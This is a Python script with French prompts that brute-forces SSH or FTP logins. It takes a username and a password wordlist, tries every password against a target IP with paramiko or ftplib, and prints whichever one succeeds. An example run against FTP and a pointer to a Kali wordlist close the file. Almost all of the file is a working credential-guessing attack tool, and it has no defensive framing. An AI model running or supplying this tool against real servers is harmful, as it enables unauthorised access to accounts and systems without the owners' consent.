import asyncio
import paramiko
from ftplib import FTP
import os
from tqdm import tqdm

class Connector:
    def __init__(self):
        pass

    async def ssh_connect(self, ip, port, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=username, password=password, timeout=5)
            return True
        except Exception as e:
            return False

    async def ftp_connect(self, ip, username, password):
        try:
            ftp = FTP(ip)
            ftp.login(user=username, passwd=password)
            ftp.quit()
            return True
        except Exception as e:
            return False

    async def bruteforce(self, ip, type):
        username = input("Entrer un nom d'utilisateur : ")

        while True:
            wordlist = input("Entrer le chemin complet du fichier de mots de passe : (press 'e' to exit)")

            if not os.path.exists(wordlist) and wordlist != 'e':
                print("Le fichier du wordlist n'existe pas.")
            elif wordlist == 'e':
                print("Exiting the bruteforce ...")
                return
            else:
                break

        with open(wordlist, 'r', encoding="utf8") as file:
            passwords = [password.strip() for password in file]

        pbar = tqdm(total=len(passwords), desc="Bruteforce", unit="passwords")
        tasks = []
        for password in passwords:
            if type == "ssh":
                tasks.append(self.ssh_connect(ip, 22, username, password))
            elif type == "ftp":
                tasks.append(self.ftp_connect(ip, username, password))
        results = await asyncio.gather(*tasks)

        for password, success in zip(passwords, results):
            if success:
                print("Mot de passe trouvé :", password)
                return
            pbar.update(1)
        pbar.close()

# Exemple d'utilisation
connector = Connector()

# Test de la fonction bruteforce pour FTP
print("\nTest de bruteforce pour FTP:")
asyncio.run(connector.bruteforce("votre_ip", "ftp"))


#/usr/share/wordlists/fasttrack.txt